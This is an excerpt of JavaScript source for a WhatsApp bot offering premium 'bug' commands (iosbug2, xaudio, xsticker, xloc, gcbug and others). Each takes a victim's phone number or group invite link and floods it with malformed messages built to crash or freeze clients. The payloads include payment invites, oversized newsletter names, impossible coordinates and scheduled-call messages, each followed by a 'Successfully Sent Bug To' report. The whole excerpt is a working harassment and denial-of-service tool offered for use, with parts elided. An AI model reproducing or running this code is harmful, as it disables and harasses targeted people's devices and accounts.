...
await AlyaBotInc.sendMessage(from, {text: xeonlod[i], edit: key })
}
} 
...
case 'x': {
if (!isPremium) return replygcalya(mess.prem)
if (!args[0]) return replygcalya(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx|5`) 
await loading()
...
case 'iosbug2': {
if (!isPremium) return replygcalya(mess.prem)
if (!text) return replygcalya(`Example usage: ${prefix + command} 5`)
amount = text * 30
for (let i = 0; i < amount; i++) {
await AlyaBotInc.relayMessage(m.chat, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await sleep(1400)
}
}
break
...
amount = text.split("|")[1] * 30
for (let i = 0; i < amount; i++) {
await AlyaBotInc.relayMessage(victim, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await sleep(1400)
}
replygcalya(`Successfully Sent Bug To ${victim}`)
}
...
amount = text * 30
for (let i = 0; i < amount; i++) {
await AlyaBotInc.sendMessage(m.chat, { "caption": `${ownername}`, audio: wkwk, mimetype: 'audio/mpeg', ptt:false,"title":`p`,"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: botname.repeat(10000),serverMessageId: 2 }}},{quoted: abug2 })
}
}
break
case 'xaudio': {
if (!isPremium) return replygcalya(mess.prem)
if (!text) return replygcalya(`Example usage:\n ${prefix + command} 91xxxxxxxxxx|5`)
await loading()
victim = text.split("|")[0]+"@s.whatsapp.net"
amount = text.split("|")[1] * 30
for (let i = 0; i < amount; i++) {
await AlyaBotInc.sendMessage(victim, { "caption": `${ownername}`, audio: wkwk, mimetype: 'audio/mpeg', ptt:false,"title":`p`,"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: botname.repeat(10000),serverMessageId: 2 }}},{quoted: abug2 })
}
replygcalya(`Successfully Sent Bug To ${victim}`)
}
break
case 'xsticker': {
if (!isPremium) return replygcalya(mess.prem)
if (!text) return replygcalya(`Example: ${prefix + command} 91xxxxxxxxxx|5`)
await loading()
victim = text.split("|")[0]+"@s.whatsapp.net"
amount = text.split("|")[1] * 30
for (let i = 0; i < amount; i++) {
await AlyaBotInc.sendVideoAsSticker(victim, xsteek, abug2, { packname: packname, author: author })
}
replygcalya(`Successfully Sent Bug To ${victim}`)
}
break
case 'xsticker2': {
if (!isPremium) return replygcalya(mess.prem)
if (!text) return replygcalya(`Example: ${prefix + command} 5`)
amount = text * 2
for (let i = 0; i < amount; i++) {
await AlyaBotInc.sendVideoAsSticker(m.chat, xsteek, abug2, { packname: packname, author: author })
}
}
break
case 'xloc2': {
...
for (let i = 0; i < amount; i++) {
AlyaBotInc.sendMessage(from, { location: { degreesLatitude: 173.282, degreesLongitude: -19.378, name: botname, address: ownername, url: `https://${XeonOP}.com`, comment: botname, jpegThumbnail: null } }, { quoted: abug2 })
}
}
break
case 'xloc': {
...
XeonOP = ownername.repeat(0)
for (let i = 0; i < amount; i++) {
AlyaBotInc.sendMessage(victim, { location: { degreesLatitude: 173.282, degreesLongitude: -19.378, name: botname, address: ownername, url: `https://${XeonOP}.com`, comment: botname, jpegThumbnail: null } }, { quoted: abug2 })
}
replygcalya(`Successfully Sent Bug To ${victim}`)
}
break
...
amount = text.split("|")[1] * 30
for (let i = 0; i < amount; i++) {
await AlyaBotInc.sendMessage(victim, { text: '' }, { quoted: abug2 })
}
replygcalya(`Successfully Sent Bug To ${victim}`)
}
break
...
amount = text * 30
for (let i = 0; i < amount; i++) {
await AlyaBotInc.sendMessage(from, { text: '' }, { quoted: abug2 })
}
}
break
case 'xkill2': {
...
replygcalya(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
}
break
case 'iosgoogle': {
if (!isPremium) return replygcalya(mess.prem)
...
amount = "50"
for (let i = 0; i < amount; i++) {
AlyaBotInc.relayMessage(victim,{ 
"paymentInviteMessage": {
serviceType: "UPI",
...
AlyaBotInc.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcalya(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
...
AlyaBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcalya(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
...
if (!args[0]) return replygcalya(`Use ${prefix+command} number\nExample ${prefix+command} 2348100835767`)
await loading()
if (args.length < 1) return replygcalya(`Use ${prefix+command} number\nExample ${prefix+command} 2348100835767`)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "15"
for (let i = 0; i < amount; i++) {
const alyabug1 = `${alyatext1}`
...
AlyaBotInc.relayMessage(victim, order.message, { messageId: order.key.id })
}
replygcalya(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
}
break
case 'gcbug' : {
if (!isPremium) return replygcalya(mess.premium)
 if (!args[0]) return replygcalya(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await AlyaBotInc.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const alyabug1 = `${alyatext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
...
AlyaBotInc.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replygcalya(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
}
break
case 'delaygcbug' :  {
if (!isPremium) return replygcalya(mess.premium)
...
AlyaBotInc.relayMessage(xeongc, order.message, { messageId: order.key.id })
}
replygcalya(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
}
break
...
let xeontesx = await AlyaBotInc.onWhatsApp(xeonnumx)
if (xeontesx.length == 0) return replygcalya(`Enter a valid and registered number on WhatsApp!!!`)
...
AlyaBotInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'banv1': {
if (!isPremium) return replyprem(mess.premium)
